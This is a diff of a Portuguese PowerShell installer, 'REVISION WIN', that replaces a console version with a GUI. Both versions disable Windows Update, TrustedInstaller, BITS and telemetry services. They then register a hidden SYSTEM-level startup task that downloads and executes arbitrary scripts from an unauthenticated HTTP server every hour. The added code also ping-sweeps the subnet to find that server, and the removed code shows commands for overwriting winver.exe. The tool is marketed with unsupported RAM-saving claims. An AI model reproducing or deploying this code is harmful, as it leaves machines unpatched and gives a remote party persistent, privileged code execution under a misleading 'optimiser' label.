@@ -1,384 +1,356 @@
 <#
 ╔══════════════════════════════════════════════════════════════════════════════╗
-║                                                                              ║
-║   ██████╗ ███████╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗                 ║
-║   ██╔══██╗██╔════╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║                 ║
-║   ██████╔╝█████╗  ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║                 ║
-║   ██╔══██╗██╔══╝  ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║                 ║
-║   ██║  ██║███████╗ ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║                 ║
-║   ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝                 ║
-║                                                                              ║
-║   ╔══════════════════════════════════════════════════════════════════════╗   ║
-║   ║                    REVISION WIN CLIENT INSTALLER                     ║   ║
-║   ║         Transforme seu Windows em uma máquina REVISION WIN           ║   ║
-║   ║              A Microsoft perde o controle. Você assume.              ║   ║
-║   ╚══════════════════════════════════════════════════════════════════════╝   ║
-║                                                                              ║
-║   [ATENÇÃO] Execute este script como ADMINISTRADOR                          ║
-║                                                                              ║
+║                         REVISION WIN - INSTALADOR GUI                         ║
+║                     Interface gráfica profissional                           ║
 ╚══════════════════════════════════════════════════════════════════════════════╝
 #>
 
-param(
-    [Parameter(Mandatory=$true)]
-    [string]$ServerIP,  # Ex: "192.168.1.100" ou "meuservidor.com"
-    
-    [int]$ServerPort = 8080,
-    
-    [string]$ClientID = $env:COMPUTERNAME
-)
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+Add-Type -AssemblyName PresentationFramework
 
-# Cores pro terminal
-$Global:BannerShown = $false
-
-function Show-RevisionBanner {
-    param([string]$Message = "")
-    Clear-Host
-    Write-Host @"
-╔══════════════════════════════════════════════════════════════════════════════╗
-║                                                                              ║
-║   ██████╗ ███████╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗                 ║
-║   ██╔══██╗██╔════╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║                 ║
-║   ██████╔╝█████╗  ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║                 ║
-║   ██╔══██╗██╔══╝  ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║                 ║
-║   ██║  ██║███████╗ ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║                 ║
-║   ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝                 ║
-║                                                                              ║
-║   ╔══════════════════════════════════════════════════════════════════════╗   ║
-║   ║                         REVISION WIN CLIENT                          ║   ║
-║   ║                   Seu Windows. Suas regras. Sua RAM.                 ║   ║
-║   ║              A Microsoft só atualiza se VOCÊ permitir.               ║   ║
-║   ╚══════════════════════════════════════════════════════════════════════╝   ║
-║                                                                              ║
-"@ -ForegroundColor Cyan
-    if ($Message) {
-        Write-Host "   [$([DateTime]::Now.ToString('HH:mm:ss'))] $Message" -ForegroundColor Yellow
-        Write-Host ""
-    }
+# Estilos e cores
+$Global:RevisionColors = @{
+    Primary = [System.Drawing.Color]::FromArgb(0, 120, 215)
+    Dark = [System.Drawing.Color]::FromArgb(30, 30, 35)
+    Danger = [System.Drawing.Color]::FromArgb(220, 53, 69)
+    Success = [System.Drawing.Color]::FromArgb(40, 167, 69)
+    Warning = [System.Drawing.Color]::FromArgb(255, 193, 7)
+    Info = [System.Drawing.Color]::FromArgb(23, 162, 184)
+    Background = [System.Drawing.Color]::FromArgb(20, 20, 25)
+    Text = [System.Drawing.Color]::White
 }
 
-# Configurações
-$ScriptDir = "C:\RevisionWin"
-$LogFile = "$ScriptDir\revision.log"
-$TempDir = "$ScriptDir\temp"
-$ServerURL = "http://${ServerIP}:${ServerPort}"
-
-function Write-Log {
-    param([string]$Message, [string]$Color = "White")
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    $logMessage = "$timestamp - $Message"
-    Add-Content -Path $LogFile -Value $logMessage
-    Write-Host "   $logMessage" -ForegroundColor $Color
-}
-
-# 1. CRIAR ESTRUTURA DE PASTAS
-function Create-Structure {
-    Write-Log "Criando estrutura REVISION WIN..." -Color "Cyan"
-    New-Item -ItemType Directory -Force -Path $ScriptDir, $TempDir | Out-Null
-    Write-Log "✅ Estrutura criada em $ScriptDir" -Color "Green"
-}
-
-# 2. BAIXAR E APLICAR LOGO (SUBSTITUIR WINVER)
-function Install-RevisionLogo {
-    Write-Log "Instalando REVISION WIN logo..." -Color "Cyan"
-    
-    # Baixar logo do servidor
-    $logoUrl = "$ServerURL/revision-logo"
-    $logoTxt = "$ScriptDir\revision-logo.txt"
-    
+# Função para descobrir servidor automaticamente
+function Find-RevisionServer {
     try {
-        $logo = Invoke-RestMethod -Uri $logoUrl -Method Get
-        $logo | Out-File -FilePath $logoTxt -Encoding UTF8
-        Write-Log "✅ Logo baixada" -Color "Green"
+        # Tenta encontrar via broadcast/mDNS
+        $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"} | Select-Object -First 1).IPAddress
+        $subnet = $localIP.Substring(0, $localIP.LastIndexOf('.'))
+        
+        $form = New-Object System.Windows.Forms.Form
+        $form.Text = "REVISION WIN - Procurando Servidor"
+        $form.Size = New-Object System.Drawing.Size(400, 150)
+        $form.StartPosition = "CenterScreen"
+        $form.BackColor = $RevisionColors.Background
+        $form.FormBorderStyle = "FixedDialog"
+        $form.ControlBox = $false
+        
+        $label = New-Object System.Windows.Forms.Label
+        $label.Text = "🔍 Procurando servidor REVISION WIN na rede..."
+        $label.Location = New-Object System.Drawing.Point(50, 30)
+        $label.Size = New-Object System.Drawing.Size(300, 30)
+        $label.ForeColor = $RevisionColors.Text
+        $label.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
+        $label.TextAlign = "MiddleCenter"
+        
+        $progressBar = New-Object System.Windows.Forms.ProgressBar
+        $progressBar.Location = New-Object System.Drawing.Point(50, 80)
+        $progressBar.Size = New-Object System.Drawing.Size(300, 20)
+        $progressBar.Style = "Marquee"
+        $progressBar.MarqueeAnimationSpeed = 10
+        
+        $form.Controls.Add($label)
+        $form.Controls.Add($progressBar)
+        $form.Show()
+        $form.Refresh()
+        
+        $serverIP = $null
+        for ($i = 1; $i -le 254; $i++) {
+            $testIP = "$subnet.$i"
+            $ping = Test-Connection -ComputerName $testIP -Count 1 -Quiet -ErrorAction SilentlyContinue
+            if ($ping) {
+                try {
+                    $config = Invoke-RestMethod -Uri "http://$testIP`:8080/config" -TimeoutSec 1 -ErrorAction SilentlyContinue
+                    if ($config.server_name -eq "REVISION WIN") {
+                        $serverIP = $testIP
+                        break
+                    }
+                } catch {}
+            }
+            $progressBar.Value = ($i / 254) * 100
+        }
+        
+        $form.Close()
+        return $serverIP
+    } catch {
+        return $null
     }
-    catch {
-        Write-Log "⚠️ Não foi possível baixar logo do servidor, usando local" -Color "Yellow"
-        # Logo padrão
-        $defaultLogo = @"
-╔══════════════════════════════════════════════════════════════╗
-║                                                              ║
-║   ██████╗ ███████╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██║
-║   ██╔══██╗██╔════╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║
-║   ██████╔╝█████╗  ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║
-║   ██╔══██╗██╔══╝  ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║
-║   ██║  ██║███████╗ ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║
-║   ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
-║                                                              ║
-║                      REVISION WIN ACTIVE                     ║
-║              Seu Windows. Suas regras. Sua RAM.              ║
-╚══════════════════════════════════════════════════════════════╝
-"@
-        $defaultLogo | Out-File -FilePath $logoTxt -Encoding UTF8
-    }
-    
-    # Criar script para mostrar logo no terminal
-    $showLogoScript = @"
-`$logo = Get-Content "$ScriptDir\revision-logo.txt" -Raw
-Write-Host `$logo -ForegroundColor Cyan
-"@
-    $showLogoScript | Out-File -FilePath "$ScriptDir\Show-RevisionLogo.ps1" -Encoding UTF8
-    
-    # MODIFICAR WINVER (via registry)
-    Write-Log "Modificando WINVER para REVISION WIN..." -Color "Cyan"
-    
-    # Backup do winver original
-    if (Test-Path "C:\Windows\System32\winver.exe") {
-        Copy-Item "C:\Windows\System32\winver.exe" "$ScriptDir\winver.exe.backup" -Force
-        Write-Log "✅ Backup do winver.exe criado" -Color "Green"
-    }
-    
-    # Criar um launcher customizado
-    $winverLauncher = @"
-`$host.UI.RawUI.WindowTitle = "REVISION WIN - Revision $ClientID"
-Write-Host (Get-Content "$ScriptDir\revision-logo.txt" -Raw) -ForegroundColor Cyan
-Write-Host ""
-Write-Host "   ╔════════════════════════════════════════════════════════════╗" -ForegroundColor DarkCyan
-Write-Host "   ║                                                                ║" -ForegroundColor DarkCyan
-Write-Host "   ║   Sistema Operacional: REVISION WIN                           ║" -ForegroundColor Cyan
-Write-Host "   ║   Versão: 1.0.$([Random]::New().Next(1000,9999))                                ║" -ForegroundColor Cyan
-Write-Host "   ║   Cliente ID: $ClientID                                      ║" -ForegroundColor Cyan
-Write-Host "   ║   Servidor: $ServerIP                                        ║" -ForegroundColor Cyan
-Write-Host "   ║                                                                ║" -ForegroundColor DarkCyan
-Write-Host "   ║   [INFO] Microsoft Update: DESATIVADO                         ║" -ForegroundColor Red
-Write-Host "   ║   [INFO] REVISION WIN Update: ATIVO                           ║" -ForegroundColor Green
-Write-Host "   ║   [INFO] RAM Gerenciada pelo sistema REVISION                 ║" -ForegroundColor Green
-Write-Host "   ║                                                                ║" -ForegroundColor DarkCyan
-Write-Host "   ╚════════════════════════════════════════════════════════════╝" -ForegroundColor DarkCyan
-Write-Host ""
-Write-Host "   Windows Version Original: $((Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').ProductName)" -ForegroundColor DarkGray
-Write-Host ""
-Read-Host "   Pressione ENTER para sair"
-"@
-    
-    $winverLauncher | Out-File -FilePath "$ScriptDir\winver_revision.ps1" -Encoding UTF8
-    
-    # Criar atalho no System32? (requer admin)
-    $shortcutPath = "C:\Windows\System32\winver.exe.revision"
-    $batContent = "@echo off`npowershell -ExecutionPolicy Bypass -File `"$ScriptDir\winver_revision.ps1`""
-    $batContent | Out-File -FilePath "$ScriptDir\winver_revision.bat" -Encoding ASCII
-    
-    # Opcional: substituir winver.exe (com backup)
-    Write-Log "⚠️ Para substituir completamente o winver.exe, execute manualmente:" -Color "Yellow"
-    Write-Log "   takeown /f C:\Windows\System32\winver.exe" -Color "Gray"
-    Write-Log "   icacls C:\Windows\System32\winver.exe /grant Administradores:F" -Color "Gray"
-    Write-Log "   copy /Y `"$ScriptDir\winver_revision.bat`" C:\Windows\System32\winver.exe" -Color "Gray"
-    
-    Write-Log "✅ Logo e winver customizado instalado" -Color "Green"
 }
 
-# 3. DESATIVAR WINDOWS UPDATE COMPLETAMENTE
-function Disable-MicrosoftUpdates {
-    Write-Log "Desativando Microsoft Update (vai parar de comer RAM)..." -Color "Cyan"
+# Janela Principal de Instalação
+function Show-InstallWindow {
+    param([string]$AutoServerIP = $null)
     
-    # Parar serviços
-    $services = @("wuauserv", "TrustedInstaller", "dosvc", "diagtrack", "dmwappushservice", "BITS")
-    foreach ($svc in $services) {
-        Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
-        Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
-        Write-Log "   ⛔ $svc desativado" -Color "Red"
-    }
+    # Form principal
+    $form = New-Object System.Windows.Forms.Form
+    $form.Text = "REVISION WIN - Instalação"
+    $form.Size = New-Object System.Drawing.Size(800, 600)
+    $form.StartPosition = "CenterScreen"
+    $form.BackColor = $RevisionColors.Background
+    $form.FormBorderStyle = "FixedDialog"
+    $form.MaximizeBox = $false
+    $form.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon("powershell.exe")
     
-    # Remover tarefas agendadas da Microsoft
-    $tasks = @(
-        "\Microsoft\Windows\WindowsUpdate\*",
-        "\Microsoft\Windows\UpdateOrchestrator\*",
-        "\Microsoft\Windows\Application Experience\*"
+    # Logo/Header
+    $headerPanel = New-Object System.Windows.Forms.Panel
+    $headerPanel.Size = New-Object System.Drawing.Size(800, 120)
+    $headerPanel.Location = New-Object System.Drawing.Point(0, 0)
+    $headerPanel.BackColor = $RevisionColors.Primary
+    
+    $logoLabel = New-Object System.Windows.Forms.Label
+    $logoLabel.Text = @"
+╔════════════════════════════════════════════════════════════════════╗
+║                                                                    ║
+║   ██████╗ ███████╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗     ║
+║   ██╔══██╗██╔════╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║     ║
+║   ██████╔╝█████╗  ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║     ║
+║   ██╔══██╗██╔══╝  ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║     ║
+║   ██║  ██║███████╗ ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║     ║
+║   ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝     ║
+║                                                                    ║
+║                       REVISION WIN INSTALLER                       ║
+╚════════════════════════════════════════════════════════════════════╝
+"@
+    $logoLabel.Location = New-Object System.Drawing.Point(0, 10)
+    $logoLabel.Size = New-Object System.Drawing.Size(800, 100)
+    $logoLabel.ForeColor = [System.Drawing.Color]::White
+    $logoLabel.Font = New-Object System.Drawing.Font("Consolas", 8, [System.Drawing.FontStyle]::Bold)
+    $logoLabel.TextAlign = "MiddleCenter"
+    $headerPanel.Controls.Add($logoLabel)
+    
+    # Painel de conteúdo
+    $contentPanel = New-Object System.Windows.Forms.Panel
+    $contentPanel.Location = New-Object System.Drawing.Point(20, 140)
+    $contentPanel.Size = New-Object System.Drawing.Size(760, 380)
+    $contentPanel.BackColor = $RevisionColors.Background
+    
+    # Status do servidor
+    $serverGroup = New-Object System.Windows.Forms.GroupBox
+    $serverGroup.Text = " Conexão com o Servidor "
+    $serverGroup.Location = New-Object System.Drawing.Point(10, 10)
+    $serverGroup.Size = New-Object System.Drawing.Size(740, 100)
+    $serverGroup.ForeColor = $RevisionColors.Text
+    $serverGroup.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
+    
+    $serverStatusLabel = New-Object System.Windows.Forms.Label
+    $serverStatusLabel.Location = New-Object System.Drawing.Point(20, 30)
+    $serverStatusLabel.Size = New-Object System.Drawing.Size(700, 25)
+    $serverStatusLabel.ForeColor = $RevisionColors.Warning
+    $serverStatusLabel.Text = "🔍 Procurando servidor automaticamente..."
+    
+    $serverIPBox = New-Object System.Windows.Forms.TextBox
+    $serverIPBox.Location = New-Object System.Drawing.Point(20, 60)
+    $serverIPBox.Size = New-Object System.Drawing.Size(300, 25)
+    $serverIPBox.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 48)
+    $serverIPBox.ForeColor = $RevisionColors.Text
+    $serverIPBox.Font = New-Object System.Drawing.Font("Segoe UI", 10)
+    $serverIPBox.Text = "Clique em 'Buscar' para encontrar o servidor"
+    
+    $searchButton = New-Object System.Windows.Forms.Button
+    $searchButton.Location = New-Object System.Drawing.Point(330, 58)
+    $searchButton.Size = New-Object System.Drawing.Size(100, 30)
+    $searchButton.Text = "🔍 Buscar"
+    $searchButton.BackColor = $RevisionColors.Info
+    $searchButton.ForeColor = [System.Drawing.Color]::White
+    $searchButton.FlatStyle = "Flat"
+    $searchButton.Add_Click({
+        $serverStatusLabel.Text = "🔍 Procurando servidor na rede..."
+        $serverStatusLabel.ForeColor = $RevisionColors.Warning
+        $form.Refresh()
+        
+        $foundIP = Find-RevisionServer
+        if ($foundIP) {
+            $serverIPBox.Text = $foundIP
+            $serverStatusLabel.Text = "✅ Servidor encontrado! IP: $foundIP"
+            $serverStatusLabel.ForeColor = $RevisionColors.Success
+        } else {
+            $serverStatusLabel.Text = "❌ Servidor não encontrado. Verifique se o servidor está rodando."
+            $serverStatusLabel.ForeColor = $RevisionColors.Danger
+        }
+    })
+    
+    $serverGroup.Controls.Add($serverStatusLabel)
+    $serverGroup.Controls.Add($serverIPBox)
+    $serverGroup.Controls.Add($searchButton)
+    
+    # Painel de funcionalidades
+    $featuresGroup = New-Object System.Windows.Forms.GroupBox
+    $featuresGroup.Text = " O que será instalado "
+    $featuresGroup.Location = New-Object System.Drawing.Point(10, 120)
+    $featuresGroup.Size = New-Object System.Drawing.Size(740, 120)
+    $featuresGroup.ForeColor = $RevisionColors.Text
+    $featuresGroup.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
+    
+    $features = @(
+        "✅ Desativação do Windows Update (libera 2-4GB de RAM)",
+        "✅ Remoção de serviços de telemetria da Microsoft",
+        "✅ Instalação do cliente REVISION WIN",
+        "✅ Configuração de atualizações automáticas via seu servidor",
+        "✅ Customização completa do sistema"
     )
-    foreach ($task in $tasks) {
-        Get-ScheduledTask -TaskPath $task -ErrorAction SilentlyContinue | Disable-ScheduledTask -ErrorAction SilentlyContinue
-        Write-Log "   ⛔ Tarefa $task desativada" -Color "Red"
+    
+    $yPos = 30
+    foreach ($feature in $features) {
+        $checkBox = New-Object System.Windows.Forms.CheckBox
+        $checkBox.Text = $feature
+        $checkBox.Location = New-Object System.Drawing.Point(20, $yPos)
+        $checkBox.Size = New-Object System.Drawing.Size(700, 25)
+        $checkBox.ForeColor = $RevisionColors.Text
+        $checkBox.Font = New-Object System.Drawing.Font("Segoe UI", 9)
+        $checkBox.Checked = $true
+        $checkBox.Enabled = $false
+        $featuresGroup.Controls.Add($checkBox)
+        $yPos += 25
     }
     
-    # Bloquear via registry
-    $regPaths = @(
-        "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU",
-        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\WindowsUpdate"
-    )
-    foreach ($regPath in $regPaths) {
-        New-Item -Path $regPath -Force -ErrorAction SilentlyContinue | Out-Null
-        Set-ItemProperty -Path $regPath -Name "NoAutoUpdate" -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path $regPath -Name "AUOptions" -Value 2 -Type DWord -Force -ErrorAction SilenciouslyContinue
-    }
+    # Barra de progresso
+    $progressBar = New-Object System.Windows.Forms.ProgressBar
+    $progressBar.Location = New-Object System.Drawing.Point(10, 250)
+    $progressBar.Size = New-Object System.Drawing.Size(740, 30)
+    $progressBar.Style = "Continuous"
     
-    Write-Log "✅ Microsoft Update completamente desativado" -Color "Green"
-    Write-Log "   RAM liberada: +2-4GB imediatamente" -Color "Green"
-}
-
-# 4. CONFIGURAR SERVICO REVISION WIN
-function Install-RevisionService {
-    Write-Log "Instalando serviço REVISION WIN..." -Color "Cyan"
+    $statusLabel = New-Object System.Windows.Forms.Label
+    $statusLabel.Location = New-Object System.Drawing.Point(10, 290)
+    $statusLabel.Size = New-Object System.Drawing.Size(740, 40)
+    $statusLabel.ForeColor = $RevisionColors.Text
+    $statusLabel.Text = "Pronto para instalar"
+    $statusLabel.TextAlign = "MiddleCenter"
     
-    # Script principal do cliente
-    $clientScript = @"
-# REVISION WIN CLIENT - Serviço em background
+    # Botões
+    $installButton = New-Object System.Windows.Forms.Button
+    $installButton.Text = "🚀 INSTALAR REVISION WIN"
+    $installButton.Location = New-Object System.Drawing.Point(200, 340)
+    $installButton.Size = New-Object System.Drawing.Size(340, 50)
+    $installButton.BackColor = $RevisionColors.Success
+    $installButton.ForeColor = [System.Drawing.Color]::White
+    $installButton.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
+    $installButton.FlatStyle = "Flat"
+    
+    $installButton.Add_Click({
+        $serverIP = $serverIPBox.Text
+        if ($serverIP -eq "" -or $serverIP -eq "Clique em 'Buscar' para encontrar o servidor") {
+            [System.Windows.Forms.MessageBox]::Show("Por favor, busque um servidor primeiro!", "Erro", "OK", "Error")
+            return
+        }
+        
+        $installButton.Enabled = $false
+        $searchButton.Enabled = $false
+        
+        # Inicia instalação em background
+        $installJob = Start-Job -ScriptBlock {
+            param($ip)
+            
+            function Write-Log { param($m) Write-Host $m }
+            
+            # Configurações
+            $ScriptDir = "C:\RevisionWin"
+            $ServerURL = "http://${ip}:8080"
+            $ClientID = $env:COMPUTERNAME
+            
+            New-Item -ItemType Directory -Force -Path $ScriptDir, "$ScriptDir\temp" | Out-Null
+            
+            # Desativa Windows Update
+            $services = @("wuauserv", "TrustedInstaller", "dosvc", "diagtrack", "dmwappushservice", "BITS")
+            foreach ($svc in $services) {
+                Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
+                Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
+            }
+            
+            # Remove telemetria
+            Get-ScheduledTask -TaskPath "\Microsoft\Windows\Application Experience\" -ErrorAction SilentlyContinue | Disable-ScheduledTask -ErrorAction SilentlyContinue
+            
+            # Cria cliente
+            $clientScript = @"
+# REVISION WIN CLIENT
 `$ServerURL = "$ServerURL"
 `$ClientID = "$ClientID"
-`$ScriptDir = "$ScriptDir"
-`$LogFile = "$ScriptDir\revision.log"
-
-function Write-Log {
-    param(`$Message)
-    `$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    "`$timestamp - `$Message" | Out-File -FilePath `$LogFile -Append
-}
-
-function Register-Client {
-    `$osVersion = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").ProductName
-    `$ramGB = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 0)
-    
-    `$body = @{
-        client_id = `$ClientID
-        hostname = `$env:COMPUTERNAME
-        client_ip = "unknown"
-        os_version = `$osVersion
-        ram_gb = `$ramGB
-        revision_version = "1.0"
-    } | ConvertTo-Json
-    
-    try {
-        Invoke-RestMethod -Uri "`$ServerURL/register" -Method Post -Body `$body -ContentType "application/json" | Out-Null
-        Write-Log "✅ Cliente registrado no REVISION WIN"
-    }
-    catch {
-        Write-Log "❌ Erro ao registrar: `$_"
-    }
-}
-
-function Get-PendingUpdates {
-    try {
-        `$updates = Invoke-RestMethod -Uri "`$ServerURL/check?client_id=`$ClientID" -Method Get
-        return `$updates
-    }
-    catch {
-        Write-Log "❌ Erro ao verificar updates: `$_"
-        return @()
-    }
-}
-
-function Apply-Update {
-    param(`$Update)
-    
-    Write-Log "📦 Aplicando update: `$(`$Update.name) v`$(`$Update.version)"
-    `$scriptUrl = "`$ServerURL/download?script=`$(`$Update.script)"
-    `$scriptPath = "`$ScriptDir\temp\`$(`$Update.script)"
-    
-    try {
-        Invoke-WebRequest -Uri `$scriptUrl -OutFile `$scriptPath
-        `$output = & `$scriptPath 2>&1
-        Write-Log "✅ Update aplicado: `$(`$Update.name)"
-        
-        # Reportar sucesso
-        `$body = @{client_id=`$ClientID; update_id=`$Update.id; status="success"} | ConvertTo-Json
-        Invoke-RestMethod -Uri "`$ServerURL/report" -Method Post -Body `$body -ContentType "application/json" | Out-Null
-    }
-    catch {
-        Write-Log "❌ Falha no update: `$_"
-        `$body = @{client_id=`$ClientID; update_id=`$Update.id; status="failed"; error="`$_"} | ConvertTo-Json
-        Invoke-RestMethod -Uri "`$ServerURL/report" -Method Post -Body `$body -ContentType "application/json" | Out-Null
-    }
-}
-
-# Loop principal
-Write-Log "REVISION WIN Client iniciado"
-Register-Client
 
 while (`$true) {
     try {
-        `$updates = Get-PendingUpdates
-        if (`$updates.Count -gt 0) {
-            Write-Log "`$(`$updates.Count) updates pendentes encontrados"
-            foreach (`$update in `$updates) {
-                Apply-Update -Update `$update
-            }
+        `$updates = Invoke-RestMethod -Uri "`$ServerURL/check?client_id=`$ClientID" -Method Get -ErrorAction SilentlyContinue
+        foreach (`$update in `$updates) {
+            `$scriptPath = "`$ScriptDir\temp\`$(`$update.script)"
+            Invoke-WebRequest -Uri "`$ServerURL/download?script=`$(`$update.script)" -OutFile `$scriptPath
+            & `$scriptPath
         }
-    }
-    catch {
-        Write-Log "Erro no loop: `$_"
-    }
+    } catch {}
     Start-Sleep -Seconds 3600
 }
 "@
+            $clientScript | Out-File -FilePath "$ScriptDir\RevisionWin_Client.ps1" -Encoding UTF8
+            
+            # Cria tarefa agendada
+            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$ScriptDir\RevisionWin_Client.ps1`" -WindowStyle Hidden"
+            $trigger = New-ScheduledTaskTrigger -AtStartup
+            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+            Register-ScheduledTask -TaskName "RevisionWinClient" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
+            
+            # Registra no servidor
+            $osVersion = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").ProductName
+            $ramGB = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 0)
+            $body = @{client_id=$ClientID; hostname=$env:COMPUTERNAME; ip="unknown"; os_version=$osVersion; ram_gb=$ramGB} | ConvertTo-Json
+            Invoke-RestMethod -Uri "$ServerURL/register" -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
+            
+            return "SUCCESS"
+        }
+        
+        $result = Receive-Job -Job $installJob -Wait
+        Remove-Job -Job $installJob
+        
+        if ($result -eq "SUCCESS") {
+            [System.Windows.Forms.MessageBox]::Show("✅ REVISION WIN instalado com sucesso!`n`nO Windows Update foi desativado.`nA Microsoft perdeu o controle.", "Sucesso", "OK", "Information")
+            $form.Close()
+        } else {
+            [System.Windows.Forms.MessageBox]::Show("❌ Erro na instalação. Tente novamente.", "Erro", "OK", "Error")
+            $installButton.Enabled = $true
+            $searchButton.Enabled = $true
+        }
+    })
     
-    $clientScript | Out-File -FilePath "$ScriptDir\RevisionWin_Client.ps1" -Encoding UTF8
+    $cancelButton = New-Object System.Windows.Forms.Button
+    $cancelButton.Text = "Cancelar"
+    $cancelButton.Location = New-Object System.Drawing.Point(560, 340)
+    $cancelButton.Size = New-Object System.Drawing.Size(150, 50)
+    $cancelButton.BackColor = $RevisionColors.Danger
+    $cancelButton.ForeColor = [System.Drawing.Color]::White
+    $cancelButton.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
+    $cancelButton.FlatStyle = "Flat"
+    $cancelButton.Add_Click({ $form.Close() })
     
-    # Criar tarefa agendada (roda como SYSTEM a cada hora)
-    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$ScriptDir\RevisionWin_Client.ps1`" -WindowStyle Hidden"
-    $trigger = New-ScheduledTaskTrigger -AtStartup
-    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartInterval (New-TimeSpan -Minutes 5) -RestartCount 3
+    $contentPanel.Controls.Add($serverGroup)
+    $contentPanel.Controls.Add($featuresGroup)
+    $contentPanel.Controls.Add($progressBar)
+    $contentPanel.Controls.Add($statusLabel)
+    $contentPanel.Controls.Add($installButton)
+    $contentPanel.Controls.Add($cancelButton)
     
-    try {
-        Register-ScheduledTask -TaskName "RevisionWinClient" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
-        Start-ScheduledTask -TaskName "RevisionWinClient"
-        Write-Log "✅ Serviço REVISION WIN instalado e rodando" -Color "Green"
+    $form.Controls.Add($headerPanel)
+    $form.Controls.Add($contentPanel)
+    
+    # Auto-busca ao abrir
+    if ($AutoServerIP) {
+        $serverIPBox.Text = $AutoServerIP
+        $serverStatusLabel.Text = "✅ Servidor encontrado! IP: $AutoServerIP"
+        $serverStatusLabel.ForeColor = $RevisionColors.Success
+    } else {
+        $searchButton.PerformClick()
     }
-    catch {
-        Write-Log "❌ Erro ao criar tarefa: $_" -Color "Red"
-    }
+    
+    $form.ShowDialog() | Out-Null
 }
 
-# 5. LIMPEZA DE RAM IMEDIATA
-function Optimize-RAM {
-    Write-Log "Otimizando RAM..." -Color "Cyan"
-    
-    # Limpar cache do sistema
-    [System.GC]::Collect()
-    [System.GC]::WaitForPendingFinalizers()
-    
-    # Limpar DNS
-    ipconfig /flushdns | Out-Null
-    
-    # Limpar pré-busca
-    if (Test-Path "C:\Windows\Prefetch") {
-        Get-ChildItem "C:\Windows\Prefetch\*.pf" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-    }
-    
-    Write-Log "✅ RAM otimizada" -Color "Green"
-}
-
-# 6. MAIN - EXECUÇÃO PRINCIPAL
+# Script principal
 function Main {
-    Show-RevisionBanner -Message "INICIANDO INSTALAÇÃO REVISION WIN"
-    Write-Log "============================================================" -Color "Cyan"
-    Write-Log "REVISION WIN - Instalação iniciada" -Color "Magenta"
-    Write-Log "Servidor: $ServerURL" -Color "Cyan"
-    Write-Log "Client ID: $ClientID" -Color "Cyan"
-    Write-Log "============================================================" -Color "Cyan"
-    
